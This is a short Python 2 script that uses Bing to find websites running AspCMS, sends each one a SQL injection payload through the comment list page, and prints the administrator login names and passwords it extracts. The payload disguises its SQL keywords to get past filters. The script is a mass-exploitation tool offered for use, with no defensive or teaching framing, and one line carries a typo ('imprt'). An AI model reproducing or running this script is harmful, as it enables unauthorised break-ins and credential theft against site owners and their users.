# encoding:utf8
imprt sys
sys.path.append('../')
from Searpy import google, bing
from urllib2 import urlparse
import requests
import re

path = '/plug/comment/commentList.asp?id=0'
bing_key = 'powered by aspcms'

payload = '%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20frmasterom%20{prefix}user'

url_list = []

page = 33

"""
for u in google(aspcms_key, page):
    url = urlparse.urlsplit(u)[0] + '://' + urlparse.urlsplit(u)[1]
    print url
    if url not in url_list:
        url_list.append(url + aspcms_key + '?id=0')

"""

for u in bing(bing_key, page):
    url = urlparse.urlsplit(u)[0] + '://' + urlparse.urlsplit(u)[1] + path
    if url not in url_list:
        url_list.append(url)


for url in url_list:
    try:
        r = requests.get(url+payload)
        if r.status_code == 200:
            re_user = re.findall('</span>(.*?)</div>', r.content)
            re_pass = re.findall('<div class="line2">(.*?)</div>', r.content)

            if re_pass:
                print "[+] {0}".format(url)
                print "{0}\tpass:{1}".format(re_user[0], re_pass[0])
 
    except Exception as e:
        pass


